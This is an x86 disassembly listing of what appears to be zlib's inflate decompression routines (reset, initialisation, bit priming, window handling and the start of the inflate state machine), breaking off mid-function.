  40565a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405660:	8b 04 b3             	mov    (%ebx,%esi,4),%eax
  405663:	83 c6 01             	add    $0x1,%esi
  405666:	89 04 24             	mov    %eax,(%esp)
  405669:	e8 9a 51 00 00       	call   0x40a808
  40566e:	39 fe                	cmp    %edi,%esi
  405670:	7e ee                	jle    0x405660
  405672:	89 1c 24             	mov    %ebx,(%esp)
  405675:	e8 8e 51 00 00       	call   0x40a808
  40567a:	83 c4 2c             	add    $0x2c,%esp
  40567d:	31 c0                	xor    %eax,%eax
  40567f:	5b                   	pop    %ebx
  405680:	5e                   	pop    %esi
  405681:	5f                   	pop    %edi
  405682:	5d                   	pop    %ebp
  405683:	c3                   	ret
  405684:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405688:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  40568f:	00 
  405690:	83 c4 2c             	add    $0x2c,%esp
  405693:	89 d8                	mov    %ebx,%eax
  405695:	5b                   	pop    %ebx
  405696:	5e                   	pop    %esi
  405697:	5f                   	pop    %edi
  405698:	5d                   	pop    %ebp
  405699:	c3                   	ret
  40569a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4056a0:	83 ec 1c             	sub    $0x1c,%esp
  4056a3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4056a7:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4056ae:	00 
  4056af:	89 44 24 04          	mov    %eax,0x4(%esp)
  4056b3:	8b 44 24 20          	mov    0x20(%esp),%eax
  4056b7:	89 04 24             	mov    %eax,(%esp)
  4056ba:	e8 31 ff ff ff       	call   0x4055f0
  4056bf:	83 c4 1c             	add    $0x1c,%esp
  4056c2:	c3                   	ret
  4056c3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4056c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4056d0:	83 ec 1c             	sub    $0x1c,%esp
  4056d3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4056d7:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  4056de:	00 
  4056df:	89 44 24 04          	mov    %eax,0x4(%esp)
  4056e3:	8b 44 24 20          	mov    0x20(%esp),%eax
  4056e7:	89 04 24             	mov    %eax,(%esp)
  4056ea:	e8 01 ff ff ff       	call   0x4055f0
  4056ef:	83 c4 1c             	add    $0x1c,%esp
  4056f2:	c3                   	ret
  4056f3:	90                   	nop
  4056f4:	90                   	nop
  4056f5:	90                   	nop
  4056f6:	90                   	nop
  4056f7:	90                   	nop
  4056f8:	90                   	nop
  4056f9:	90                   	nop
  4056fa:	90                   	nop
  4056fb:	90                   	nop
  4056fc:	90                   	nop
  4056fd:	90                   	nop
  4056fe:	90                   	nop
  4056ff:	90                   	nop
  405700:	b8 c0 d4 40 00       	mov    $0x40d4c0,%eax
  405705:	c3                   	ret
  405706:	8d 76 00             	lea    0x0(%esi),%esi
  405709:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405710:	b8 55 00 00 00       	mov    $0x55,%eax
  405715:	c3                   	ret
  405716:	8d 76 00             	lea    0x0(%esi),%esi
  405719:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405720:	b8 02 00 00 00       	mov    $0x2,%eax
  405725:	2b 44 24 04          	sub    0x4(%esp),%eax
  405729:	8b 04 85 40 d5 40 00 	mov    0x40d540(,%eax,4),%eax
  405730:	c3                   	ret
  405731:	eb 0d                	jmp    0x405740
  405733:	90                   	nop
  405734:	90                   	nop
  405735:	90                   	nop
  405736:	90                   	nop
  405737:	90                   	nop
  405738:	90                   	nop
  405739:	90                   	nop
  40573a:	90                   	nop
  40573b:	90                   	nop
  40573c:	90                   	nop
  40573d:	90                   	nop
  40573e:	90                   	nop
  40573f:	90                   	nop
  405740:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405744:	0f af 44 24 08       	imul   0x8(%esp),%eax
  405749:	89 44 24 04          	mov    %eax,0x4(%esp)
  40574d:	e9 6e 50 00 00       	jmp    0x40a7c0
  405752:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405759:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405760:	8b 44 24 08          	mov    0x8(%esp),%eax
  405764:	89 44 24 04          	mov    %eax,0x4(%esp)
  405768:	e9 9b 50 00 00       	jmp    0x40a808
  40576d:	90                   	nop
  40576e:	90                   	nop
  40576f:	90                   	nop
  405770:	55                   	push   %ebp
  405771:	57                   	push   %edi
  405772:	89 d5                	mov    %edx,%ebp
  405774:	56                   	push   %esi
  405775:	53                   	push   %ebx
  405776:	83 ec 08             	sub    $0x8,%esp
  405779:	8b 30                	mov    (%eax),%esi
  40577b:	89 44 24 04          	mov    %eax,0x4(%esp)
  40577f:	83 fe 03             	cmp    $0x3,%esi
  405782:	0f 96 c2             	setbe  %dl
  405785:	85 c9                	test   %ecx,%ecx
  405787:	0f 95 c0             	setne  %al
  40578a:	31 db                	xor    %ebx,%ebx
  40578c:	20 c2                	and    %al,%dl
  40578e:	88 54 24 03          	mov    %dl,0x3(%esp)
  405792:	74 4c                	je     0x4057e0
  405794:	bf 04 00 00 00       	mov    $0x4,%edi
  405799:	eb 1c                	jmp    0x4057b7
  40579b:	90                   	nop
  40579c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4057a0:	89 f8                	mov    %edi,%eax
  4057a2:	29 f0                	sub    %esi,%eax
  4057a4:	83 f8 03             	cmp    $0x3,%eax
  4057a7:	89 c6                	mov    %eax,%esi
  4057a9:	0f 96 c0             	setbe  %al
  4057ac:	83 c3 01             	add    $0x1,%ebx
  4057af:	84 c0                	test   %al,%al
  4057b1:	74 2d                	je     0x4057e0
  4057b3:	39 d9                	cmp    %ebx,%ecx
  4057b5:	76 29                	jbe    0x4057e0
  4057b7:	0f b6 54 1d 00       	movzbl 0x0(%ebp,%ebx,1),%edx
  4057bc:	83 fe 02             	cmp    $0x2,%esi
  4057bf:	19 c0                	sbb    %eax,%eax
  4057c1:	f7 d0                	not    %eax
  4057c3:	38 c2                	cmp    %al,%dl
  4057c5:	74 29                	je     0x4057f0
  4057c7:	84 d2                	test   %dl,%dl
  4057c9:	74 d5                	je     0x4057a0
  4057cb:	0f b6 44 24 03       	movzbl 0x3(%esp),%eax
  4057d0:	31 f6                	xor    %esi,%esi
  4057d2:	83 c3 01             	add    $0x1,%ebx
  4057d5:	84 c0                	test   %al,%al
  4057d7:	75 da                	jne    0x4057b3
  4057d9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4057e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4057e4:	89 30                	mov    %esi,(%eax)
  4057e6:	83 c4 08             	add    $0x8,%esp
  4057e9:	89 d8                	mov    %ebx,%eax
  4057eb:	5b                   	pop    %ebx
  4057ec:	5e                   	pop    %esi
  4057ed:	5f                   	pop    %edi
  4057ee:	5d                   	pop    %ebp
  4057ef:	c3                   	ret
  4057f0:	83 c6 01             	add    $0x1,%esi
  4057f3:	83 fe 03             	cmp    $0x3,%esi
  4057f6:	0f 96 c0             	setbe  %al
  4057f9:	eb b1                	jmp    0x4057ac
  4057fb:	90                   	nop
  4057fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405800:	55                   	push   %ebp
  405801:	57                   	push   %edi
  405802:	89 d5                	mov    %edx,%ebp
  405804:	56                   	push   %esi
  405805:	53                   	push   %ebx
  405806:	89 cf                	mov    %ecx,%edi
  405808:	83 ec 1c             	sub    $0x1c,%esp
  40580b:	8b 70 1c             	mov    0x1c(%eax),%esi
  40580e:	8b 56 34             	mov    0x34(%esi),%edx
  405811:	85 d2                	test   %edx,%edx
  405813:	0f 84 e7 00 00 00    	je     0x405900
  405819:	8b 5e 28             	mov    0x28(%esi),%ebx
  40581c:	85 db                	test   %ebx,%ebx
  40581e:	74 51                	je     0x405871
  405820:	39 df                	cmp    %ebx,%edi
  405822:	73 69                	jae    0x40588d
  405824:	8b 46 30             	mov    0x30(%esi),%eax
  405827:	29 c3                	sub    %eax,%ebx
  405829:	39 fb                	cmp    %edi,%ebx
  40582b:	0f 47 df             	cmova  %edi,%ebx
  40582e:	01 d0                	add    %edx,%eax
  405830:	89 ea                	mov    %ebp,%edx
  405832:	29 fa                	sub    %edi,%edx
  405834:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  405838:	89 04 24             	mov    %eax,(%esp)
  40583b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40583f:	e8 84 4f 00 00       	call   0x40a7c8
  405844:	29 df                	sub    %ebx,%edi
  405846:	0f 85 86 00 00 00    	jne    0x4058d2
  40584c:	8b 46 30             	mov    0x30(%esi),%eax
  40584f:	8b 4e 28             	mov    0x28(%esi),%ecx
  405852:	01 d8                	add    %ebx,%eax
  405854:	39 c8                	cmp    %ecx,%eax
  405856:	89 46 30             	mov    %eax,0x30(%esi)
  405859:	74 65                	je     0x4058c0
  40585b:	8b 56 2c             	mov    0x2c(%esi),%edx
  40585e:	31 c0                	xor    %eax,%eax
  405860:	39 d1                	cmp    %edx,%ecx
  405862:	76 05                	jbe    0x405869
  405864:	01 d3                	add    %edx,%ebx
  405866:	89 5e 2c             	mov    %ebx,0x2c(%esi)
  405869:	83 c4 1c             	add    $0x1c,%esp
  40586c:	5b                   	pop    %ebx
  40586d:	5e                   	pop    %esi
  40586e:	5f                   	pop    %edi
  40586f:	5d                   	pop    %ebp
  405870:	c3                   	ret
  405871:	8b 4e 24             	mov    0x24(%esi),%ecx
  405874:	b3 01                	mov    $0x1,%bl
  405876:	c7 46 30 00 00 00 00 	movl   $0x0,0x30(%esi)
  40587d:	c7 46 2c 00 00 00 00 	movl   $0x0,0x2c(%esi)
  405884:	d3 e3                	shl    %cl,%ebx
  405886:	39 df                	cmp    %ebx,%edi
  405888:	89 5e 28             	mov    %ebx,0x28(%esi)
  40588b:	72 97                	jb     0x405824
  40588d:	29 dd                	sub    %ebx,%ebp
  40588f:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  405893:	89 14 24             	mov    %edx,(%esp)
  405896:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40589a:	e8 29 4f 00 00       	call   0x40a7c8
  40589f:	8b 46 28             	mov    0x28(%esi),%eax
  4058a2:	c7 46 30 00 00 00 00 	movl   $0x0,0x30(%esi)
  4058a9:	89 46 2c             	mov    %eax,0x2c(%esi)
  4058ac:	83 c4 1c             	add    $0x1c,%esp
  4058af:	31 c0                	xor    %eax,%eax
  4058b1:	5b                   	pop    %ebx
  4058b2:	5e                   	pop    %esi
  4058b3:	5f                   	pop    %edi
  4058b4:	5d                   	pop    %ebp
  4058b5:	c3                   	ret
  4058b6:	8d 76 00             	lea    0x0(%esi),%esi
  4058b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4058c0:	8b 56 2c             	mov    0x2c(%esi),%edx
  4058c3:	31 c0                	xor    %eax,%eax
  4058c5:	c7 46 30 00 00 00 00 	movl   $0x0,0x30(%esi)
  4058cc:	39 d1                	cmp    %edx,%ecx
  4058ce:	77 94                	ja     0x405864
  4058d0:	eb 97                	jmp    0x405869
  4058d2:	8b 46 34             	mov    0x34(%esi),%eax
  4058d5:	29 fd                	sub    %edi,%ebp
  4058d7:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4058db:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4058df:	89 04 24             	mov    %eax,(%esp)
  4058e2:	e8 e1 4e 00 00       	call   0x40a7c8
  4058e7:	8b 46 28             	mov    0x28(%esi),%eax
  4058ea:	89 7e 30             	mov    %edi,0x30(%esi)
  4058ed:	89 46 2c             	mov    %eax,0x2c(%esi)
  4058f0:	83 c4 1c             	add    $0x1c,%esp
  4058f3:	31 c0                	xor    %eax,%eax
  4058f5:	5b                   	pop    %ebx
  4058f6:	5e                   	pop    %esi
  4058f7:	5f                   	pop    %edi
  4058f8:	5d                   	pop    %ebp
  4058f9:	c3                   	ret
  4058fa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405900:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  405907:	00 
  405908:	8b 4e 24             	mov    0x24(%esi),%ecx
  40590b:	b2 01                	mov    $0x1,%dl
  40590d:	d3 e2                	shl    %cl,%edx
  40590f:	89 54 24 04          	mov    %edx,0x4(%esp)
  405913:	8b 50 28             	mov    0x28(%eax),%edx
  405916:	89 14 24             	mov    %edx,(%esp)
  405919:	ff 50 20             	call   *0x20(%eax)
  40591c:	85 c0                	test   %eax,%eax
  40591e:	89 46 34             	mov    %eax,0x34(%esi)
  405921:	74 07                	je     0x40592a
  405923:	89 c2                	mov    %eax,%edx
  405925:	e9 ef fe ff ff       	jmp    0x405819
  40592a:	b8 01 00 00 00       	mov    $0x1,%eax
  40592f:	e9 35 ff ff ff       	jmp    0x405869
  405934:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40593a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  405940:	8b 54 24 04          	mov    0x4(%esp),%edx
  405944:	85 d2                	test   %edx,%edx
  405946:	0f 84 86 00 00 00    	je     0x4059d2
  40594c:	8b 42 1c             	mov    0x1c(%edx),%eax
  40594f:	85 c0                	test   %eax,%eax
  405951:	74 7f                	je     0x4059d2
  405953:	8b 48 08             	mov    0x8(%eax),%ecx
  405956:	c7 40 1c 00 00 00 00 	movl   $0x0,0x1c(%eax)
  40595d:	c7 42 14 00 00 00 00 	movl   $0x0,0x14(%edx)
  405964:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  40596b:	c7 42 18 00 00 00 00 	movl   $0x0,0x18(%edx)
  405972:	85 c9                	test   %ecx,%ecx
  405974:	74 06                	je     0x40597c
  405976:	83 e1 01             	and    $0x1,%ecx
  405979:	89 4a 30             	mov    %ecx,0x30(%edx)
  40597c:	8d 90 30 05 00 00    	lea    0x530(%eax),%edx
  405982:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405988:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  40598f:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  405996:	c7 40 14 00 80 00 00 	movl   $0x8000,0x14(%eax)
  40599d:	c7 40 20 00 00 00 00 	movl   $0x0,0x20(%eax)
  4059a4:	c7 40 38 00 00 00 00 	movl   $0x0,0x38(%eax)
  4059ab:	c7 40 3c 00 00 00 00 	movl   $0x0,0x3c(%eax)
  4059b2:	89 50 6c             	mov    %edx,0x6c(%eax)
  4059b5:	89 50 50             	mov    %edx,0x50(%eax)
  4059b8:	89 50 4c             	mov    %edx,0x4c(%eax)
  4059bb:	c7 80 c0 1b 00 00 01 	movl   $0x1,0x1bc0(%eax)
  4059c2:	00 00 00 
  4059c5:	c7 80 c4 1b 00 00 ff 	movl   $0xffffffff,0x1bc4(%eax)
  4059cc:	ff ff ff 
  4059cf:	31 c0                	xor    %eax,%eax
  4059d1:	c3                   	ret
  4059d2:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4059d7:	c3                   	ret
  4059d8:	90                   	nop
  4059d9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4059e0:	8b 54 24 04          	mov    0x4(%esp),%edx
  4059e4:	85 d2                	test   %edx,%edx
  4059e6:	74 28                	je     0x405a10
  4059e8:	8b 42 1c             	mov    0x1c(%edx),%eax
  4059eb:	85 c0                	test   %eax,%eax
  4059ed:	74 21                	je     0x405a10
  4059ef:	c7 40 28 00 00 00 00 	movl   $0x0,0x28(%eax)
  4059f6:	c7 40 2c 00 00 00 00 	movl   $0x0,0x2c(%eax)
  4059fd:	c7 40 30 00 00 00 00 	movl   $0x0,0x30(%eax)
  405a04:	e9 37 ff ff ff       	jmp    0x405940
  405a09:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405a10:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405a15:	c3                   	ret
  405a16:	8d 76 00             	lea    0x0(%esi),%esi
  405a19:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405a20:	55                   	push   %ebp
  405a21:	57                   	push   %edi
  405a22:	56                   	push   %esi
  405a23:	53                   	push   %ebx
  405a24:	83 ec 1c             	sub    $0x1c,%esp
  405a27:	8b 7c 24 30          	mov    0x30(%esp),%edi
  405a2b:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  405a2f:	85 ff                	test   %edi,%edi
  405a31:	74 6d                	je     0x405aa0
  405a33:	8b 77 1c             	mov    0x1c(%edi),%esi
  405a36:	85 f6                	test   %esi,%esi
  405a38:	74 66                	je     0x405aa0
  405a3a:	85 db                	test   %ebx,%ebx
  405a3c:	78 55                	js     0x405a93
  405a3e:	89 dd                	mov    %ebx,%ebp
  405a40:	89 d8                	mov    %ebx,%eax
  405a42:	c1 fd 04             	sar    $0x4,%ebp
  405a45:	83 e0 0f             	and    $0xf,%eax
  405a48:	83 c5 01             	add    $0x1,%ebp
  405a4b:	83 fb 2f             	cmp    $0x2f,%ebx
  405a4e:	0f 4e d8             	cmovle %eax,%ebx
  405a51:	8d 43 f8             	lea    -0x8(%ebx),%eax
  405a54:	83 f8 07             	cmp    $0x7,%eax
  405a57:	76 04                	jbe    0x405a5d
  405a59:	85 db                	test   %ebx,%ebx
  405a5b:	75 43                	jne    0x405aa0
  405a5d:	8b 46 34             	mov    0x34(%esi),%eax
  405a60:	85 c0                	test   %eax,%eax
  405a62:	74 19                	je     0x405a7d
  405a64:	3b 5e 24             	cmp    0x24(%esi),%ebx
  405a67:	74 14                	je     0x405a7d
  405a69:	89 44 24 04          	mov    %eax,0x4(%esp)
  405a6d:	8b 47 28             	mov    0x28(%edi),%eax
  405a70:	89 04 24             	mov    %eax,(%esp)
  405a73:	ff 57 24             	call   *0x24(%edi)
  405a76:	c7 46 34 00 00 00 00 	movl   $0x0,0x34(%esi)
  405a7d:	89 6e 08             	mov    %ebp,0x8(%esi)
  405a80:	89 5e 24             	mov    %ebx,0x24(%esi)
  405a83:	89 7c 24 30          	mov    %edi,0x30(%esp)
  405a87:	83 c4 1c             	add    $0x1c,%esp
  405a8a:	5b                   	pop    %ebx
  405a8b:	5e                   	pop    %esi
  405a8c:	5f                   	pop    %edi
  405a8d:	5d                   	pop    %ebp
  405a8e:	e9 4d ff ff ff       	jmp    0x4059e0
  405a93:	f7 db                	neg    %ebx
  405a95:	31 ed                	xor    %ebp,%ebp
  405a97:	eb b8                	jmp    0x405a51
  405a99:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405aa0:	83 c4 1c             	add    $0x1c,%esp
  405aa3:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405aa8:	5b                   	pop    %ebx
  405aa9:	5e                   	pop    %esi
  405aaa:	5f                   	pop    %edi
  405aab:	5d                   	pop    %ebp
  405aac:	c3                   	ret
  405aad:	8d 76 00             	lea    0x0(%esi),%esi
  405ab0:	57                   	push   %edi
  405ab1:	56                   	push   %esi
  405ab2:	53                   	push   %ebx
  405ab3:	83 ec 10             	sub    $0x10,%esp
  405ab6:	8b 44 24 28          	mov    0x28(%esp),%eax
  405aba:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  405abe:	85 c0                	test   %eax,%eax
  405ac0:	0f 84 da 00 00 00    	je     0x405ba0
  405ac6:	80 38 31             	cmpb   $0x31,(%eax)
  405ac9:	0f 85 d1 00 00 00    	jne    0x405ba0
  405acf:	83 7c 24 2c 38       	cmpl   $0x38,0x2c(%esp)
  405ad4:	0f 85 c6 00 00 00    	jne    0x405ba0
  405ada:	85 db                	test   %ebx,%ebx
  405adc:	0f 84 d5 00 00 00    	je     0x405bb7
  405ae2:	8b 43 20             	mov    0x20(%ebx),%eax
  405ae5:	c7 43 18 00 00 00 00 	movl   $0x0,0x18(%ebx)
  405aec:	85 c0                	test   %eax,%eax
  405aee:	0f 84 8c 00 00 00    	je     0x405b80
  405af4:	8b 53 28             	mov    0x28(%ebx),%edx
  405af7:	8b 4b 24             	mov    0x24(%ebx),%ecx
  405afa:	85 c9                	test   %ecx,%ecx
  405afc:	74 72                	je     0x405b70
  405afe:	c7 44 24 08 cc 1b 00 	movl   $0x1bcc,0x8(%esp)
  405b05:	00 
  405b06:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  405b0d:	00 
  405b0e:	89 14 24             	mov    %edx,(%esp)
  405b11:	ff d0                	call   *%eax
  405b13:	85 c0                	test   %eax,%eax
  405b15:	89 c6                	mov    %eax,%esi
  405b17:	0f 84 93 00 00 00    	je     0x405bb0
  405b1d:	89 43 1c             	mov    %eax,0x1c(%ebx)
  405b20:	c7 40 34 00 00 00 00 	movl   $0x0,0x34(%eax)
  405b27:	8b 44 24 24          	mov    0x24(%esp),%eax
  405b2b:	89 1c 24             	mov    %ebx,(%esp)
  405b2e:	89 44 24 04          	mov    %eax,0x4(%esp)
  405b32:	e8 e9 fe ff ff       	call   0x405a20
  405b37:	89 c7                	mov    %eax,%edi
  405b39:	31 c0                	xor    %eax,%eax
  405b3b:	85 ff                	test   %edi,%edi
  405b3d:	75 11                	jne    0x405b50
  405b3f:	83 c4 10             	add    $0x10,%esp
  405b42:	5b                   	pop    %ebx
  405b43:	5e                   	pop    %esi
  405b44:	5f                   	pop    %edi
  405b45:	c3                   	ret
  405b46:	8d 76 00             	lea    0x0(%esi),%esi
  405b49:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405b50:	89 74 24 04          	mov    %esi,0x4(%esp)
  405b54:	8b 43 28             	mov    0x28(%ebx),%eax
  405b57:	89 04 24             	mov    %eax,(%esp)
  405b5a:	ff 53 24             	call   *0x24(%ebx)
  405b5d:	c7 43 1c 00 00 00 00 	movl   $0x0,0x1c(%ebx)
  405b64:	83 c4 10             	add    $0x10,%esp
  405b67:	89 f8                	mov    %edi,%eax
  405b69:	5b                   	pop    %ebx
  405b6a:	5e                   	pop    %esi
  405b6b:	5f                   	pop    %edi
  405b6c:	c3                   	ret
  405b6d:	8d 76 00             	lea    0x0(%esi),%esi
  405b70:	c7 43 24 60 57 40 00 	movl   $0x405760,0x24(%ebx)
  405b77:	eb 85                	jmp    0x405afe
  405b79:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  405b80:	c7 43 20 40 57 40 00 	movl   $0x405740,0x20(%ebx)
  405b87:	c7 43 28 00 00 00 00 	movl   $0x0,0x28(%ebx)
  405b8e:	31 d2                	xor    %edx,%edx
  405b90:	b8 40 57 40 00       	mov    $0x405740,%eax
  405b95:	e9 5d ff ff ff       	jmp    0x405af7
  405b9a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405ba0:	83 c4 10             	add    $0x10,%esp
  405ba3:	b8 fa ff ff ff       	mov    $0xfffffffa,%eax
  405ba8:	5b                   	pop    %ebx
  405ba9:	5e                   	pop    %esi
  405baa:	5f                   	pop    %edi
  405bab:	c3                   	ret
  405bac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405bb0:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  405bb5:	eb 88                	jmp    0x405b3f
  405bb7:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405bbc:	eb 81                	jmp    0x405b3f
  405bbe:	66 90                	xchg   %ax,%ax
  405bc0:	83 ec 1c             	sub    $0x1c,%esp
  405bc3:	8b 44 24 28          	mov    0x28(%esp),%eax
  405bc7:	c7 44 24 04 0f 00 00 	movl   $0xf,0x4(%esp)
  405bce:	00 
  405bcf:	89 44 24 0c          	mov    %eax,0xc(%esp)
  405bd3:	8b 44 24 24          	mov    0x24(%esp),%eax
  405bd7:	89 44 24 08          	mov    %eax,0x8(%esp)
  405bdb:	8b 44 24 20          	mov    0x20(%esp),%eax
  405bdf:	89 04 24             	mov    %eax,(%esp)
  405be2:	e8 c9 fe ff ff       	call   0x405ab0
  405be7:	83 c4 1c             	add    $0x1c,%esp
  405bea:	c3                   	ret
  405beb:	90                   	nop
  405bec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  405bf0:	56                   	push   %esi
  405bf1:	53                   	push   %ebx
  405bf2:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405bf6:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405bfa:	85 c0                	test   %eax,%eax
  405bfc:	74 55                	je     0x405c53
  405bfe:	8b 50 1c             	mov    0x1c(%eax),%edx
  405c01:	85 d2                	test   %edx,%edx
  405c03:	74 4e                	je     0x405c53
  405c05:	85 c9                	test   %ecx,%ecx
  405c07:	78 37                	js     0x405c40
  405c09:	83 f9 10             	cmp    $0x10,%ecx
  405c0c:	7f 45                	jg     0x405c53
  405c0e:	8b 72 3c             	mov    0x3c(%edx),%esi
  405c11:	8d 1c 31             	lea    (%ecx,%esi,1),%ebx
  405c14:	83 fb 20             	cmp    $0x20,%ebx
  405c17:	77 3a                	ja     0x405c53
  405c19:	b8 01 00 00 00       	mov    $0x1,%eax
  405c1e:	89 5a 3c             	mov    %ebx,0x3c(%edx)
  405c21:	d3 e0                	shl    %cl,%eax
  405c23:	89 f1                	mov    %esi,%ecx
  405c25:	83 e8 01             	sub    $0x1,%eax
  405c28:	23 44 24 14          	and    0x14(%esp),%eax
  405c2c:	d3 e0                	shl    %cl,%eax
  405c2e:	01 42 38             	add    %eax,0x38(%edx)
  405c31:	31 c0                	xor    %eax,%eax
  405c33:	5b                   	pop    %ebx
  405c34:	5e                   	pop    %esi
  405c35:	c3                   	ret
  405c36:	8d 76 00             	lea    0x0(%esi),%esi
  405c39:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  405c40:	c7 42 38 00 00 00 00 	movl   $0x0,0x38(%edx)
  405c47:	c7 42 3c 00 00 00 00 	movl   $0x0,0x3c(%edx)
  405c4e:	31 c0                	xor    %eax,%eax
  405c50:	5b                   	pop    %ebx
  405c51:	5e                   	pop    %esi
  405c52:	c3                   	ret
  405c53:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405c58:	eb d9                	jmp    0x405c33
  405c5a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  405c60:	55                   	push   %ebp
  405c61:	57                   	push   %edi
  405c62:	56                   	push   %esi
  405c63:	53                   	push   %ebx
  405c64:	83 ec 7c             	sub    $0x7c,%esp
  405c67:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  405c6e:	85 c0                	test   %eax,%eax
  405c70:	0f 84 1e 14 00 00    	je     0x407094
  405c76:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  405c7d:	8b 78 1c             	mov    0x1c(%eax),%edi
  405c80:	85 ff                	test   %edi,%edi
  405c82:	0f 84 0c 14 00 00    	je     0x407094
  405c88:	8b 40 0c             	mov    0xc(%eax),%eax
  405c8b:	85 c0                	test   %eax,%eax
  405c8d:	89 44 24 30          	mov    %eax,0x30(%esp)
  405c91:	0f 84 fd 13 00 00    	je     0x407094
  405c97:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  405c9e:	8b 18                	mov    (%eax),%ebx
  405ca0:	85 db                	test   %ebx,%ebx
  405ca2:	0f 84 a8 13 00 00    	je     0x407050
  405ca8:	8b 40 04             	mov    0x4(%eax),%eax
  405cab:	89 44 24 34          	mov    %eax,0x34(%esp)
  405caf:	8b 07                	mov    (%edi),%eax
  405cb1:	83 f8 0b             	cmp    $0xb,%eax
  405cb4:	0f 84 96 01 00 00    	je     0x405e50
  405cba:	8b b4 24 90 00 00 00 	mov    0x90(%esp),%esi
  405cc1:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  405cc5:	89 7c 24 24          	mov    %edi,0x24(%esp)
  405cc9:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%esp)
  405cd0:	00 
  405cd1:	8b 56 10             	mov    0x10(%esi),%edx
  405cd4:	8b 77 38             	mov    0x38(%edi),%esi
  405cd7:	89 54 24 28          	mov    %edx,0x28(%esp)
  405cdb:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  405cdf:	8d 97 30 05 00 00    	lea    0x530(%edi),%edx
  405ce5:	89 f1                	mov    %esi,%ecx
  405ce7:	8b 77 3c             	mov    0x3c(%edi),%esi
  405cea:	89 54 24 50          	mov    %edx,0x50(%esp)
  405cee:	8d 97 f0 02 00 00    	lea    0x2f0(%edi),%edx
  405cf4:	89 ef                	mov    %ebp,%edi
  405cf6:	89 dd                	mov    %ebx,%ebp
  405cf8:	89 54 24 4c          	mov    %edx,0x4c(%esp)
  405cfc:	89 f3                	mov    %esi,%ebx
  405cfe:	89 ce                	mov    %ecx,%esi
  405d00:	83 f8 1e             	cmp    $0x1e,%eax
  405d03:	0f 87 8b 13 00 00    	ja     0x407094
  405d09:	ff 24 85 50 d7 40 00 	jmp    *0x40d750(,%eax,4)
  405d10:	83 fb 1f             	cmp    $0x1f,%ebx
  405d13:	77 2a                	ja     0x405d3f
  405d15:	85 ff                	test   %edi,%edi
  405d17:	0f 84 e3 03 00 00    	je     0x406100
  405d1d:	89 d9                	mov    %ebx,%ecx
  405d1f:	eb 08                	jmp    0x405d29
  405d21:	85 ff                	test   %edi,%edi
  405d23:	0f 84 a7 12 00 00    	je     0x406fd0
  405d29:	83 c5 01             	add    $0x1,%ebp
  405d2c:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  405d30:	83 ef 01             	sub    $0x1,%edi
  405d33:	d3 e0                	shl    %cl,%eax
  405d35:	83 c1 08             	add    $0x8,%ecx
  405d38:	01 c6                	add    %eax,%esi
